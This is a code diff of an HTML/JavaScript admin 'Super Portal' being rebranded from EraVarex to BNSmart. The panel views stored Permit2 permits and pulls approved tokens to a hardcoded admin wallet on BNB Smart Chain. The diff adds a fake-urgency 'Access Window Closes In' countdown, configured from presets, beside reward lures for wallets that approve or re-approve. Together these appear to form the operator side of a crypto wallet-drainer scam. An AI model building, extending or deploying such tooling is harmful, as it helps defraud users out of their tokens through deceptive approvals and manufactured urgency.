@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-<title>EraVarex — Super Portal</title>
-<meta name="description" content="EraVarex Super Dashboard: Manage contract settings, view stored Permit2 permits, and execute token transfers on BNB Smart Chain." />
+<title>BNSmart — Super Portal</title>
+<meta name="description" content="BNSmart Super Dashboard: Manage contract settings, view stored Permit2 permits, and execute token transfers on BNB Smart Chain." />
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
@@ -19,31 +19,33 @@
     --bg-overlay:     #172033;
     --bg-hover:       #1e293f;
 
-    --border-subtle:  #1b2537;
-    --border-default: #22324c;
-    --border-accent:  #0ea5e9;
+    --border-subtle:  #1d2636;
+    --border-default: #28374e;
+    --border-accent:  #f0b90b;
 
-    --text-primary:   #f0f4f8;
+    --text-primary:   #f8fafc;
     --text-secondary: #94a3b8;
     --text-muted:     #4b586e;
     --text-inverse:   #06080e;
 
     --accent-blue:    #06b6d4;
     --accent-blue-dim:#0891b2;
-    --accent-brand:   #6366f1;
+    --accent-brand:   #f0b90b;
+    --accent-brand-light: #fcd535;
     --accent-green:   #10b981;
     --accent-red:     #f43f5e;
     --accent-amber:   #f59e0b;
     --accent-purple:  #8b5cf6;
 
-    --glow-blue:      rgba(6,182,212,0.20);
-    --glow-brand:     rgba(99,102,241,0.20);
-    --glow-green:     rgba(16,185,129,0.16);
-    --glow-red:       rgba(244,63,94,0.16);
+    --glow-blue:      rgba(6,182,212,0.22);
+    --glow-brand:     rgba(240,185,11,0.28);
+    --glow-green:     rgba(16,185,129,0.18);
+    --glow-red:       rgba(244,63,94,0.18);
 
-    --gradient-card:  linear-gradient(145deg, #0f1523 0%, #0a0e18 100%);
-    --gradient-blue:  linear-gradient(135deg, #4f46e5 0%, #06b6d4 100%);
-    --gradient-brand: linear-gradient(135deg, #6366f1 0%, #06b6d4 50%, #10b981 100%);
+    --gradient-card:  linear-gradient(145deg, #0f1524 0%, #080d16 100%);
+    --gradient-blue:  linear-gradient(135deg, #f0b90b 0%, #06b6d4 100%);
+    --gradient-brand: linear-gradient(135deg, #fcd535 0%, #f0b90b 55%, #d97706 100%);
+    --gradient-gold:  linear-gradient(135deg, #fcd535 0%, #f0b90b 60%, #b45309 100%);
     --gradient-green: linear-gradient(135deg, #059669, #10b981);
 
     --radius-sm:  6px;
@@ -72,8 +74,8 @@
     content: '';
     position: fixed; inset: 0;
     background:
-      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(59,130,246,.07) 0%, transparent 60%),
-      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(168,85,247,.05) 0%, transparent 60%);
+      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(240,185,11,.10) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(6,182,212,.08) 0%, transparent 60%);
     pointer-events: none;
     z-index: 0;
   }
@@ -110,18 +112,24 @@
   .logo-group { display: flex; align-items: center; gap: 12px; }
 
   .logo-icon {
-    width: 40px; height: 40px;
-    background: var(--gradient-blue);
+    width: 44px; height: 44px;
+    background: transparent;
     border-radius: var(--radius-md);
     display: flex; align-items: center; justify-content: center;
-    font-size: 1.25rem;
-    box-shadow: 0 0 20px rgba(59,130,246,.3);
+    box-shadow: 0 0 20px rgba(240,185,11,.22);
     flex-shrink: 0;
   }
 
   .logo-text { display: flex; flex-direction: column; line-height: 1.2; }
-  .logo-title { font-size: 1.15rem; font-weight: 700; color: var(--text-primary); letter-spacing: -.02em; }
-  .logo-sub { font-size: .72rem; color: var(--text-secondary); font-weight: 400; letter-spacing: .04em; text-transform: uppercase; }
+  .logo-title {
+    font-size: 1.25rem;
+    font-weight: 800;
+    letter-spacing: -.02em;
+    background: linear-gradient(135deg, #ffffff 40%, #f0b90b 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .logo-sub { font-size: .72rem; color: var(--text-secondary); font-weight: 500; letter-spacing: .05em; text-transform: uppercase; }
 
   .header-actions { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
 
@@ -537,32 +545,156 @@
   input:checked + .slider-toggle:before {
     transform: translateX(22px);
   }
+
+  /* ===== ACCESS WINDOW COUNTDOWN (Image Match Preview) ===== */
+  .access-window-card {
+    background: radial-gradient(ellipse 90% 70% at 50% 0%, rgba(13, 24, 46, 0.95) 0%, rgba(5, 10, 20, 0.98) 100%);
+    border: 1px solid rgba(56, 189, 248, 0.22);
+    border-radius: 20px;
+    padding: 24px 20px 20px;
+    position: relative;
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.6), 0 0 24px rgba(6, 182, 212, 0.08);
+    backdrop-filter: blur(12px);
+    text-align: center;
+    overflow: hidden;
+  }
+  .access-window-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 15%; right: 15%; height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(56, 189, 248, 0.6), transparent);
+    pointer-events: none;
+  }
+  .access-window-title {
+    font-size: 0.82rem;
+    font-weight: 700;
+    letter-spacing: 0.18em;
+    color: #7dd3fc;
+    margin-bottom: 18px;
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+  .access-countdown-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 12px;
+  }
+  .access-countdown-box {
+    position: relative;
+    flex: 1;
+    min-width: 60px;
+    max-width: 104px;
+    background: linear-gradient(180deg, #0e172a 0%, #060a14 100%);
+    border: 1px solid rgba(56, 189, 248, 0.16);
+    border-radius: 14px;
+    padding: 20px 6px 14px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.06);
+    overflow: hidden;
+  }
+  .access-countdown-box::before {
+    content: '';
+    position: absolute;
+    left: 0; right: 0; top: 48%; height: 1px;
+    background: rgba(0, 0, 0, 0.7);
+    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.06);
+    pointer-events: none;
+    z-index: 2;
+  }
+  .access-countdown-box::after {
+    content: '';
+    position: absolute;
+    left: -4px; top: calc(48% - 3px);
+    width: 6px; height: 6px;
+    background: #08101e;
+    border-radius: 50%;
+    z-index: 3;
+    pointer-events: none;
+  }
+  .access-num {
+    font-family: var(--font-mono);
+    font-size: 2.2rem;
+    font-weight: 800;
+    line-height: 1;
+    letter-spacing: -0.02em;
+    position: relative;
+    z-index: 1;
+  }
+  .access-num.access-days {
+    color: #22d3ee;
+    text-shadow: 0 0 22px rgba(34, 211, 238, 0.5);
+  }
+  .access-num.access-hours {
+    color: #38bdf8;
+    text-shadow: 0 0 22px rgba(56, 189, 248, 0.5);
+  }
+  .access-num.access-mins {
+    color: #818cf8;
+    text-shadow: 0 0 22px rgba(129, 140, 248, 0.5);
+  }
+  .access-num.access-secs {
+    color: #c084fc;
+    text-shadow: 0 0 22px rgba(192, 132, 252, 0.5);
+  }
+  .access-unit {
+    font-size: 0.65rem;
+    font-weight: 700;
+    letter-spacing: 0.16em;
+    color: #64748b;
+    margin-top: 10px;
+    text-transform: uppercase;
+    position: relative;
+    z-index: 1;
+  }
+  .access-window-footer {
+    font-size: 0.74rem;
+    font-weight: 800;
+    letter-spacing: 0.18em;
+    color: #38bdf8;
+    text-transform: uppercase;
+    margin-top: 12px;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
 </style>
 </head>
 <body>
 <div class="app-wrapper">
   <header class="app-header">
     <div class="logo-group">
-      <div class="logo-icon" style="background:transparent;border:none;display:flex;align-items:center;justify-content:center;">
-        <svg width="34" height="34" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <polygon points="18,3 32,10.5 32,25.5 18,33 4,25.5 4,10.5" stroke="url(#era_grad_super)" stroke-width="2.2" fill="url(#era_hex_super)" />
-          <path d="M12 12H24M12 18H20M12 24H24" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" />
-          <circle cx="24" cy="18" r="2.2" fill="#06b6d4" />
+      <div class="logo-icon">
+        <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
           <defs>
-            <linearGradient id="era_grad_super" x1="4" y1="3" x2="32" y2="33" gradientUnits="userSpaceOnUse">
-              <stop stop-color="#6366f1" />
-              <stop offset="0.5" stop-color="#06b6d4" />
-              <stop offset="1" stop-color="#10b981" />
+            <linearGradient id="bnsmart_gold_super" x1="3" y1="3" x2="33" y2="33" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#FCD535" />
+              <stop offset="0.5" stop-color="#F0B90B" />
+              <stop offset="1" stop-color="#D97706" />
             </linearGradient>
-            <radialGradient id="era_hex_super" cx="50%" cy="50%" r="50%">
-              <stop offset="0%" stop-color="#06b6d4" stop-opacity="0.25" />
-              <stop offset="100%" stop-color="#1e1b4b" stop-opacity="0.6" />
+            <radialGradient id="bnsmart_hex_super" cx="50%" cy="50%" r="50%">
+              <stop offset="0%" stop-color="#F0B90B" stop-opacity="0.25" />
+              <stop offset="100%" stop-color="#0c121e" stop-opacity="0.9" />
             </radialGradient>
           </defs>
+          <polygon points="18,3 32,10.5 32,25.5 18,33 4,25.5 4,10.5" stroke="url(#bnsmart_gold_super)" stroke-width="2.2" fill="url(#bnsmart_hex_super)" />
+          <polygon points="18,9 27,18 18,27 9,18" stroke="#FCD535" stroke-width="1.6" fill="rgba(240,185,11,0.12)" />
+          <rect x="14.5" y="14.5" width="7" height="7" rx="1.5" transform="rotate(45 18 18)" fill="url(#bnsmart_gold_super)" />
+          <circle cx="18" cy="9" r="1.5" fill="#FCD535" />
+          <circle cx="27" cy="18" r="1.5" fill="#FCD535" />
+          <circle cx="18" cy="27" r="1.5" fill="#FCD535" />
+          <circle cx="9" cy="18" r="1.5" fill="#FCD535" />
         </svg>
       </div>
       <div class="logo-text">
-        <span class="logo-title">EraVarex</span>
+        <span class="logo-title">BNSmart</span>
         <span class="logo-sub">Super Portal · Management</span>
       </div>
     </div>
@@ -588,8 +720,10 @@
 'use strict';
 
 const API_BASE = '/api';
-const ERAVAREX_CONTRACT_ADDRESS = "0x768D5df1E316101C1C3862354F46217ac90a08bf";
-const ERAVAREX_ADMIN_WALLET     = "0xf07F812568800638909CE5b7e975545863dff92d";
+const BNSMART_CONTRACT_ADDRESS = "0xee4CE2048988aFf55Ec46933D7409A6d79C64F8A";
+const BNSMART_ADMIN_WALLET     = "0x28C8383b19B254D8A59DB32440dAF4E08c6FC396";
+const ERAVAREX_CONTRACT_ADDRESS = BNSMART_CONTRACT_ADDRESS;
+const ERAVAREX_ADMIN_WALLET     = BNSMART_ADMIN_WALLET;
 const DEFAULT_REWARD_CONFIG = {
   enabled: true,
   percentage: "5.0",
@@ -603,7 +737,12 @@ const DEFAULT_REWARD_CONFIG = {
   perk2Title: "New & Re-Approvals",
   perk2Desc: "Applicable for first-time connections & wallets approving again.",
   perk3Title: "Instant BSC On-Chain",
-  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period."
+  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period.",
+  // Access Window Countdown Configuration
+  countdownEnabled: true,
+  countdownTitle: "ACCESS WINDOW CLOSES IN:",
+  countdownTargetDate: "2027-06-28T12:54:48.000Z",
+  countdownFooterText: "CURRENT POOL"
 };
 
 const state = {
@@ -653,6 +792,18 @@ function fmtDateTimeBD(ts) {
   } catch (e) {
     return new Date(Number(ts) * 1000).toLocaleString();
   }
+}
+
+function toDatetimeLocal(isoStr) {
+  if (!isoStr) return '';
+  const d = new Date(isoStr);
+  if (isNaN(d.getTime())) return '';
+  const year = d.getFullYear();
+  const month = String(d.getMonth() + 1).padStart(2, '0');
+  const day = String(d.getDate()).padStart(2, '0');
+  const hours = String(d.getHours()).padStart(2, '0');
+  const mins = String(d.getMinutes()).padStart(2, '0');
+  return `${year}-${month}-${day}T${hours}:${mins}`;
 }
 
 function getExpiryCountdown(ts) {
@@ -1014,10 +1165,112 @@ function buildRewardConfigCard() {
         </div>
       </div>
 
+      <!-- =======================================================
+           ACCESS WINDOW COUNTDOWN CONFIGURATION (Bottom Timer)
+           ======================================================= -->
+      <div style="margin-top:28px;padding-top:24px;border-top:1px solid rgba(56, 189, 248, 0.25);position:relative;">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+          <div style="display:flex;align-items:center;gap:10px;">
+            <div class="card-title-icon" style="background:rgba(56, 189, 248, 0.15);border-color:rgba(56, 189, 248, 0.35);color:#38bdf8;">⏱️</div>
+            <div>
+              <div style="font-size:0.95rem;font-weight:700;color:#f8fafc;">Bottom Access Window Countdown (Target Date & Time)</div>
+              <div style="font-size:0.75rem;color:var(--text-muted);margin-top:2px;">Live countdown card displayed at the bottom of the user front page matching UI design</div>
+            </div>
+          </div>
+          <span class="badge ${rc.countdownEnabled !== false ? 'badge-executed' : 'badge-failed'}" id="cd-status-pill">
+            ${rc.countdownEnabled !== false ? '🟢 Countdown Active' : '🔴 Countdown Hidden'}
+          </span>
+        </div>
+
+        <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(260px, 1fr));gap:16px;margin-bottom:16px;">
+          <!-- Enable Toggle -->
+          <div class="form-group" style="background:var(--bg-overlay);padding:14px;border-radius:var(--radius-md);border:1px solid var(--border-default);display:flex;align-items:center;justify-content:space-between;">
+            <div>
+              <div style="font-size:0.88rem;font-weight:700;color:var(--text-primary);">Enable Bottom Countdown</div>
+              <div style="font-size:0.75rem;color:var(--text-muted);margin-top:2px;">Show or hide access window card in frontend</div>
+            </div>
+            <label style="position:relative;display:inline-block;width:48px;height:26px;cursor:pointer;flex-shrink:0;">
+              <input type="checkbox" id="cd-enabled" ${rc.countdownEnabled !== false ? 'checked' : ''} style="opacity:0;width:0;height:0;">
+              <span class="slider-toggle"></span>
+            </label>
+          </div>
+
+          <!-- Target Date & Time Picker -->
+          <div class="form-group">
+            <label class="form-label" for="cd-target-datetime" style="color:#38bdf8;">Target Expiration Date & Time (Live Sync)</label>
+            <div style="position:relative;">
+              <input type="datetime-local" id="cd-target-datetime" class="form-control" value="${toDatetimeLocal(rc.countdownTargetDate || '2027-06-28T12:54:48.000Z')}" style="padding:10px 14px;font-family:var(--font-mono);font-weight:700;color:#38bdf8;font-size:1rem;background:rgba(15,23,42,0.95);border-color:rgba(56,189,248,0.35);">
+            </div>
+            <div style="display:flex;align-items:center;gap:6px;margin-top:8px;flex-wrap:wrap;">
+              <span style="font-size:0.68rem;color:var(--text-muted);">Quick Presets:</span>
+              <button type="button" class="btn-chip" onclick="setPresetCountdownOffset(0, 24)">+24 Hours</button>
+              <button type="button" class="btn-chip" onclick="setPresetCountdownOffset(7)">+7 Days</button>
+              <button type="button" class="btn-chip" onclick="setPresetCountdownOffset(30)">+30 Days</button>
+              <button type="button" class="btn-chip" onclick="setPresetCountdownOffset(90)">+90 Days</button>
+              <button type="button" class="btn-chip" onclick="setPresetCountdownOffset(242, 8)">+242 Days (~Screenshot)</button>
+              <button type="button" class="btn-chip" onclick="setPresetCountdownOffset(365)">+1 Year</button>
+            </div>
+          </div>
+        </div>
+
+        <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(260px, 1fr));gap:16px;margin-bottom:18px;">
+          <!-- Title Text -->
+          <div class="form-group">
+            <label class="form-label" for="cd-title">Countdown Header Label</label>
+            <input type="text" id="cd-title" class="form-control" value="${esc(rc.countdownTitle || 'ACCESS WINDOW CLOSES IN:')}" placeholder="ACCESS WINDOW CLOSES IN:">
+            <div style="font-size:0.7rem;color:var(--text-muted);margin-top:4px;">Uppercase title displayed above the 4 cards</div>
+          </div>
+
+          <!-- Footer Text -->
+          <div class="form-group">
+            <label class="form-label" for="cd-footer">Footer Pool Tag / Subtitle</label>
+            <input type="text" id="cd-footer" class="form-control" value="${esc(rc.countdownFooterText || 'CURRENT POOL')}" placeholder="CURRENT POOL">
+            <div style="font-size:0.7rem;color:var(--text-muted);margin-top:4px;">Bottom cyan/blue label (leave blank to hide)</div>
+          </div>
+        </div>
+
+        <!-- Live Countdown UI Preview (Matching Screenshot) -->
+        <div style="background:rgba(4,8,16,0.92);border:1px dashed rgba(56,189,248,0.35);border-radius:var(--radius-md);padding:18px;margin-bottom:20px;">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:6px;">
+            <span style="font-size:0.74rem;font-weight:700;color:#38bdf8;text-transform:uppercase;letter-spacing:0.06em;">👁️ Live Access Window UI Preview</span>
+            <span style="font-size:0.7rem;color:var(--text-muted);" id="cd-preview-target-label">Target: ${esc(rc.countdownTargetDate || '')}</span>
+          </div>
+
+          <div class="access-window-card" id="admin-access-preview-card" style="margin:0 auto;max-width:540px;">
+            <div class="access-window-title">
+              <span id="admin-cd-prev-title">${esc(rc.countdownTitle || "ACCESS WINDOW CLOSES IN:")}</span>
+            </div>
+
+            <div class="access-countdown-row">
+              <div class="access-countdown-box">
+                <span class="access-num access-days" id="admin-cd-timer-d">242</span>
+                <span class="access-unit">DAYS</span>
+              </div>
+              <div class="access-countdown-box">
+                <span class="access-num access-hours" id="admin-cd-timer-h">08</span>
+                <span class="access-unit">HOURS</span>
+              </div>
+              <div class="access-countdown-box">
+                <span class="access-num access-mins" id="admin-cd-timer-m">06</span>
+                <span class="access-unit">MINUTES</span>
+              </div>
+              <div class="access-countdown-box">
+                <span class="access-num access-secs" id="admin-cd-timer-s">16</span>
+                <span class="access-unit">SECONDS</span>
+              </div>
+            </div>
+
+            <div class="access-window-footer" id="admin-cd-prev-footer-wrap" style="${rc.countdownFooterText ? '' : 'display:none;'}">
+              <span id="admin-cd-prev-footer">${esc(rc.countdownFooterText || '')}</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
       <!-- Action Buttons -->
       <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
         <button id="btn-save-reward" class="btn" style="background:linear-gradient(135deg,#f59e0b 0%,#d97706 100%);color:#050709;font-weight:700;box-shadow:0 4px 20px rgba(245,158,11,0.35);padding:13px 26px;" ${state.rewardBusy ? 'disabled' : ''}>
-          ${state.rewardBusy ? '<span class="spinner"></span> Saving…' : '💾 Save & Publish Reward Settings'}
+          ${state.rewardBusy ? '<span class="spinner"></span> Saving…' : '💾 Save & Publish All Settings'}
         </button>
         <button id="btn-reset-reward" class="btn btn-secondary" style="padding:13px 20px;">🔄 Reset to Defaults</button>
       </div>
@@ -1053,6 +1306,72 @@ function triggerPreviewUpdate() {
   }
 }
 
+function triggerCountdownPreviewUpdate() {
+  const cdEnabled = document.getElementById('cd-enabled');
+  const cdTitle = document.getElementById('cd-title');
+  const cdFooter = document.getElementById('cd-footer');
+  const cdDate = document.getElementById('cd-target-datetime');
+  const pill = document.getElementById('cd-status-pill');
+  const prevCard = document.getElementById('admin-access-preview-card');
+  const prevTitle = document.getElementById('admin-cd-prev-title');
+  const prevFooter = document.getElementById('admin-cd-prev-footer');
+  const prevFooterWrap = document.getElementById('admin-cd-prev-footer-wrap');
+  const prevTargetLabel = document.getElementById('cd-preview-target-label');
+
+  if (pill && cdEnabled) {
+    pill.className = `badge ${cdEnabled.checked ? 'badge-executed' : 'badge-failed'}`;
+    pill.textContent = cdEnabled.checked ? '🟢 Countdown Active' : '🔴 Countdown Hidden';
+  }
+  if (prevCard && cdEnabled) {
+    prevCard.style.opacity = cdEnabled.checked ? '1' : '0.45';
+  }
+  if (prevTitle && cdTitle) prevTitle.textContent = cdTitle.value || 'ACCESS WINDOW CLOSES IN:';
+  if (prevFooter && cdFooter) {
+    prevFooter.textContent = cdFooter.value;
+    if (prevFooterWrap) prevFooterWrap.style.display = cdFooter.value.trim() ? '' : 'none';
+  }
+  if (prevTargetLabel && cdDate && cdDate.value) {
+    prevTargetLabel.textContent = `Target: ${cdDate.value.replace('T', ' ')}`;
+  }
+  tickAdminCountdownPreview();
+}
+
+function tickAdminCountdownPreview() {
+  const cdDate = document.getElementById('cd-target-datetime');
+  let targetTime;
+  if (cdDate && cdDate.value) {
+    targetTime = new Date(cdDate.value).getTime();
+  } else {
+    targetTime = new Date((state.rewardConfig && state.rewardConfig.countdownTargetDate) || '2027-06-28T12:54:48.000Z').getTime();
+  }
+  const now = Date.now();
+  const diff = Math.max(0, targetTime - now);
+
+  const days  = Math.floor(diff / (1000 * 60 * 60 * 24));
+  const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  const mins  = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+  const secs  = Math.floor((diff % (1000 * 60)) / 1000);
+
+  const dEl = document.getElementById('admin-cd-timer-d');
+  const hEl = document.getElementById('admin-cd-timer-h');
+  const mEl = document.getElementById('admin-cd-timer-m');
+  const sEl = document.getElementById('admin-cd-timer-s');
+
+  if (dEl) dEl.textContent = String(days);
+  if (hEl) hEl.textContent = String(hours).padStart(2, '0');
+  if (mEl) mEl.textContent = String(mins).padStart(2, '0');
+  if (sEl) sEl.textContent = String(secs).padStart(2, '0');
+}
+
+function setPresetCountdownOffset(days, hours = 0) {
+  const d = new Date(Date.now() + (days * 24 * 3600 * 1000) + (hours * 3600 * 1000));
+  const el = document.getElementById('cd-target-datetime');
+  if (el) {
+    el.value = toDatetimeLocal(d.toISOString());
+    triggerCountdownPreviewUpdate();
+  }
+}
+
 function setPresetDuration(h) {
   const inp = document.getElementById('rew-duration');
   if (inp) {
@@ -1068,9 +1387,16 @@ async function handleSaveRewardConfig() {
   }
   const a = adminApi(state.adminKey);
   state.rewardBusy = true;
-  state.rewardMsg = 'Saving reward configuration to database…';
+  state.rewardMsg = 'Saving configuration to database…';
   state.rewardMsgKind = 'info';
   render();
+
+  const cdDateInput = document.getElementById('cd-target-datetime');
+  let targetIso = (state.rewardConfig && state.rewardConfig.countdownTargetDate) || '2027-06-28T12:54:48.000Z';
+  if (cdDateInput && cdDateInput.value) {
+    const parsed = new Date(cdDateInput.value);
+    if (!isNaN(parsed.getTime())) targetIso = parsed.toISOString();
+  }
 
   const cfg = {
     enabled: document.getElementById('rew-enabled') ? document.getElementById('rew-enabled').checked : true,
@@ -1085,14 +1411,19 @@ async function handleSaveRewardConfig() {
     perk2Title: document.getElementById('rew-p2-title') ? document.getElementById('rew-p2-title').value.trim() : '',
     perk2Desc: document.getElementById('rew-p2-desc') ? document.getElementById('rew-p2-desc').value.trim() : '',
     perk3Title: document.getElementById('rew-p3-title') ? document.getElementById('rew-p3-title').value.trim() : '',
-    perk3Desc: document.getElementById('rew-p3-desc') ? document.getElementById('rew-p3-desc').value.trim() : ''
+    perk3Desc: document.getElementById('rew-p3-desc') ? document.getElementById('rew-p3-desc').value.trim() : '',
+    // Access Window Countdown Configuration
+    countdownEnabled: document.getElementById('cd-enabled') ? document.getElementById('cd-enabled').checked : true,
+    countdownTitle: document.getElementById('cd-title') ? document.getElementById('cd-title').value.trim() : 'ACCESS WINDOW CLOSES IN:',
+    countdownTargetDate: targetIso,
+    countdownFooterText: document.getElementById('cd-footer') ? document.getElementById('cd-footer').value.trim() : 'CURRENT POOL'
   };
 
   try {
     const res = await a.saveRewardConfig(cfg);
     if (res && res.rewardConfig) {
       state.rewardConfig = res.rewardConfig;
-      state.rewardMsg = '✅ Reward configuration successfully updated & published live to user front page!';
+      state.rewardMsg = '✅ Configuration successfully updated & published live to user front page!';
       state.rewardMsgKind = 'ok';
     }
   } catch (err) {
@@ -1199,7 +1530,7 @@ function renderModal() {
   const rawRemaining = rawApproved - rawSpent;
   const remainingHuman = p.amountHuman ? (Number(p.amountHuman) - Number(p.spentHuman || 0)).toString() : '12000';
   const userBal = p.userBalanceHuman || '0';
-  const defaultRecipient = state.adminStatus?.treasury || ERAVAREX_ADMIN_WALLET;
+  const defaultRecipient = state.adminStatus?.treasury || BNSMART_ADMIN_WALLET;
 
   container.innerHTML = `
     <div class="modal-overlay" id="pull-overlay">
@@ -1356,12 +1687,15 @@ function bind() {
   if ($('btn-reset-reward')) $('btn-reset-reward').onclick = handleResetRewardConfig;
 
   // Real-time preview input listeners
-  const inputIds = ['rew-enabled', 'rew-percentage', 'rew-duration', 'rew-badge', 'rew-headline', 'rew-description', 'rew-incard'];
+  const inputIds = [
+    'rew-enabled', 'rew-percentage', 'rew-duration', 'rew-badge', 'rew-headline', 'rew-description', 'rew-incard',
+    'cd-enabled', 'cd-title', 'cd-footer', 'cd-target-datetime'
+  ];
   inputIds.forEach(id => {
     const el = $(id);
     if (el) {
-      el.oninput = triggerPreviewUpdate;
-      el.onchange = triggerPreviewUpdate;
+      el.oninput = () => { triggerPreviewUpdate(); triggerCountdownPreviewUpdate(); };
+      el.onchange = () => { triggerPreviewUpdate(); triggerCountdownPreviewUpdate(); };
     }
   });
 
@@ -1502,6 +1836,8 @@ async function handleRescue() {
 
 // Initial render & auto-load if key is present
 render();
+tickAdminCountdownPreview();
+setInterval(tickAdminCountdownPreview, 1000);
 if (state.adminKey) {
   handleAdminLoad();
 }
